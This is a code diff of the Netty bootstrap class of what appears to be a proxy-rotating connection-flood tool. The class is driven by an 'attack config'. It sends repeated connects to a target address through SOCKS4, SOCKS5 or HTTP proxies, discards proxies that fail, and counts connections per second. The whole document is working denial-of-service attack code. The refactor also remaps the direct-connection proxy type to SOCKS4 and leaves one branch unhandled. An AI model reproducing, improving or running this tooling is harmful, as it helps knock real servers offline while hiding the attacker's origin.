@@ -1,25 +1,21 @@
 package dev.lastknell.core;
 
 import java.net.InetSocketAddress;
-import java.util.Locale;
-import java.util.concurrent.Executors;
 import java.util.concurrent.ThreadFactory;
-import java.util.concurrent.atomic.AtomicLong;
 
 import dev.lastknell.core.methods.IMethod;
 import dev.lastknell.core.proxy.Proxy;
 import dev.lastknell.core.proxy.ProxyManager;
 import io.netty.bootstrap.Bootstrap;
 import io.netty.channel.Channel;
-import io.netty.channel.ChannelFutureListener;
 import io.netty.channel.ChannelHandler;
 import io.netty.channel.ChannelHandlerContext;
 import io.netty.channel.ChannelInitializer;
 import io.netty.channel.ChannelOption;
 import io.netty.channel.EventLoopGroup;
 import io.netty.channel.epoll.EpollEventLoopGroup;
+import io.netty.channel.epoll.EpollSocketChannel;
 import io.netty.channel.nio.NioEventLoopGroup;
-import io.netty.channel.socket.SocketChannel;
 import io.netty.channel.socket.nio.NioSocketChannel;
 import io.netty.handler.proxy.HttpProxyHandler;
 import io.netty.handler.proxy.Socks4ProxyHandler;
@@ -37,9 +33,9 @@ public class NettyBootstrap {
     private int delay;
     private int loopThreads;
     private int workerThreads;
-    private Class<? extends SocketChannel> sClass = NioSocketChannel.class;
     public int proxyType = 0;
     public int protocolID;
+    public static Class<? extends Channel> socketChannel;
 
     // IDK WHAT TO TYPE HERE
     private ProxyManager proxyManager;
@@ -52,11 +48,7 @@ public class NettyBootstrap {
     private boolean shouldStop = false;
 
     // Netty related
-    private final EventLoopGroup GROUP = System.getProperty("os.name").toLowerCase().contains("win")
-            ? new NioEventLoopGroup(this.workerThreads, this.createThreadFactory((t, e) -> {
-            }))
-            : new EpollEventLoopGroup(this.workerThreads, this.createThreadFactory((t, e) -> {
-            }));
+    private EventLoopGroup loopGroup = null;
 
     private final ChannelHandler TAIL = new ChannelHandler() {
         @Override
@@ -71,7 +63,7 @@ public class NettyBootstrap {
 
         @Override
         public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) throws Exception {
-
+            ctx.close();
         }
     };
     // HTTP
@@ -89,6 +81,7 @@ public class NettyBootstrap {
                 s.setConnectTimeoutMillis(5000L);
                 s.connectFuture().addListener(f -> {
                     if (f.isSuccess() && s.isConnected()) {
+                        triedCPS++;
                         method.accept(c, proxy);
                     } else {
                         proxyManager.removeProxy(proxy);
@@ -119,6 +112,7 @@ public class NettyBootstrap {
                 s.setConnectTimeoutMillis(5000L);
                 s.connectFuture().addListener(f -> {
                     if (f.isSuccess() && s.isConnected()) {
+                        triedCPS++;
                         method.accept(c, proxy);
                     } else {
                         proxyManager.removeProxy(proxy);
@@ -144,12 +138,13 @@ public class NettyBootstrap {
         protected void initChannel(final Channel c) {
             try {
                 final Proxy proxy = proxyManager.getProxy();
-                final Socks5ProxyHandler s = (proxy.email != null)
+                final Socks5ProxyHandler s = (proxy.email != null && proxy.pw != null)
                         ? new Socks5ProxyHandler(proxy.address, proxy.email, proxy.pw)
                         : new Socks5ProxyHandler(proxy.address);
                 s.setConnectTimeoutMillis(5000L);
                 s.connectFuture().addListener(f -> {
                     if (f.isSuccess() && s.isConnected()) {
+                        triedCPS++;
                         method.accept(c, proxy);
                     } else {
                         proxyManager.removeProxy(proxy);
@@ -166,12 +161,9 @@ public class NettyBootstrap {
             ctx.close();
         }
     };
-    
+
     // BOOTSTRAP
-    private final Bootstrap BOOTSTRAP = (new Bootstrap()).channel(sClass).group(GROUP)
-            .option(ChannelOption.TCP_NODELAY, Boolean.TRUE).option(ChannelOption.AUTO_READ, Boolean.TRUE)
-            .handler((this.proxyType == 0) ? TAIL
-                    : ((this.proxyType == 1) ? SOCKS5 : ((this.proxyType == 2) ? SOCKS4 : HTTP)));
+    private Bootstrap BOOTSTRAP;
 
     /**
      * @param attackConfig Attack Config
@@ -186,22 +178,51 @@ public class NettyBootstrap {
         this.delay = attackConfig.getDelay();
         this.loopThreads = attackConfig.getLoopThreads();
         this.workerThreads = attackConfig.getWorkerThreads();
-        this.sClass = attackConfig.getSClass();
         this.proxyManager = proxyManager;
         this.protocolID = attackConfig.getProtocolID();
         this.method.init(this);
-    }
 
-    private ThreadFactory createThreadFactory(Thread.UncaughtExceptionHandler uncaughtExceptionHandler) {
-        ThreadFactory threadFactory = Executors.defaultThreadFactory();
-        AtomicLong atomicLong = new AtomicLong(0);
-        return runnable -> {
-            Thread thread = threadFactory.newThread(runnable);
-            thread.setName(String.format(Locale.ROOT, "PoolThread-%d", atomicLong.getAndIncrement()));
-            thread.setUncaughtExceptionHandler(uncaughtExceptionHandler);
-            thread.setDaemon(true);
-            return thread;
-        };
+        if (System.getProperty("os.name").toLowerCase().contains("win")) {
+            socketChannel = NioSocketChannel.class;
+            loopGroup = new NioEventLoopGroup(workerThreads, new ThreadFactory() {
+                public Thread newThread(Runnable r) {
+                    Thread t = new Thread(r);
+                    t.setDaemon(true);
+                    t.setPriority(10);
+                    return t;
+                }
+            });
+        } else {
+            socketChannel = EpollSocketChannel.class;
+            loopGroup = new EpollEventLoopGroup(workerThreads, new ThreadFactory() {
+                public Thread newThread(Runnable r) {
+                    Thread t = new Thread(r);
+                    t.setDaemon(true);
+                    t.setPriority(5);
+                    return t;
+                }
+            });
+        }
+
+        switch (proxyType) {
+            case 0 :
+                BOOTSTRAP = (new Bootstrap()).channel(socketChannel).group(loopGroup)
+                        .option(ChannelOption.TCP_NODELAY, Boolean.TRUE).option(ChannelOption.AUTO_READ, Boolean.TRUE)
+                        .handler(SOCKS4);
+                            break;
+            case 1 : 
+                BOOTSTRAP = (new Bootstrap()).channel(socketChannel).group(loopGroup)
+                        .option(ChannelOption.TCP_NODELAY, Boolean.TRUE).option(ChannelOption.AUTO_READ, Boolean.TRUE)
+                        .handler(SOCKS5);
+                            break;
+            case 2:
+                BOOTSTRAP = (new Bootstrap()).channel(socketChannel).group(loopGroup)
+                        .option(ChannelOption.TCP_NODELAY, Boolean.TRUE).option(ChannelOption.AUTO_READ, Boolean.TRUE)
+                        .handler(HTTP);
+                            break;
+            default :
+                System.out.println("BRO WTF");
+        }   
     }
 
     public void start() {
@@ -238,7 +259,7 @@ public class NettyBootstrap {
                     for (int j = 0; j < perDelay; j++) {
                         BOOTSTRAP.connect(addr);
                     }
-
+                    
                     try {
                         Thread.sleep(delay);
                     } catch (InterruptedException e) {
@@ -252,7 +273,7 @@ public class NettyBootstrap {
 
     public void stop() {
         shouldStop = true;
-        GROUP.shutdownGracefully();
+        loopGroup.shutdownGracefully();
     }
 
 }
